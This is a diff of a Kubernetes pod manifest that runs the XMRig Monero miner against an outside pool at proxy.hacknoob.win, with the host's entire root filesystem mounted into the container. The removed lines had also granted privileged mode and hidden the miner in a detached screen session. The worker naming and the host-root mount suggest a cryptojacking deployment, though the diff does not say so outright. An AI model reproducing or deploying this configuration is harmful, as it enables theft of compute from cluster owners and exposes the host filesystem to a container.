@@ -14,31 +14,22 @@ spec:
             - slave1
   containers:
   - name: xmrig-container-1
-    image: alpine:latest  # Using Alpine for a lightweight image
+    image: busybox
     command:
-    - /bin/sh
-    - -c
-    - |
-      apt install --no-cache screen && \
-      screen -dmS xmrig-session /home/worker1/xmrig/build/xmrig \
-      -o proxy.hacknoob.win:5551 \
-      -u slave1+150 \
-      -a rx/0 \
-      --threads "1" \
-      --no-huge-pages \
-      --cpu-priority "5" \
-      --donate-level "0"
-    resources:
-      limits:
-        memory: "257Mi"   # Adjust the memory limit if needed
-        cpu: "500m"       # Limit to half a CPU core
+    - /home/worker1/xmrig/build/xmrig
+    - -o
+    - proxy.hacknoob.win:5551
+    - -u
+    - slave1
+    - -a
+    - rx/0
+    - --cpu-no-yield
+    - --nicehash
+    - --randomx-1gb-pages
     volumeMounts:
     - name: xmrig-volume-1
-      mountPath: /  # Mount the entire / path
-    securityContext:
-      privileged: true  # Allow privileged mode
-  restartPolicy: Always  # Ensure the pod automatically restarts on failure
+      mountPath: /
   volumes:
   - name: xmrig-volume-1
     hostPath:
-      path: /  # Mount / from the host to the container
+      path: /
